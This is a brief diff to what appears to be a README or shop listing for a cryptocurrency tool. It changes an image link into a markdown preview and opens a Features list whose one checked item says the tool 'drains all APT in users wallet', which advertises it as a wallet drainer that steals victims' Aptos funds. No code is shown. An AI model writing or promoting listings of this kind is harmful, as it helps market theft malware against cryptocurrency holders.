@@ -1,4 +1,4 @@
-https://imagedelivery.net/95QNzrEeP7RU5l5WdbyrKw/24a7abc6-6bf2-45c9-7d28-a73c78b57300/shopitem
+![preview](https://imagedelivery.net/95QNzrEeP7RU5l5WdbyrKw/24a7abc6-6bf2-45c9-7d28-a73c78b57300/shopitem)
 
 # 💡 Features
 - [x] Drains all APT in users wallet.
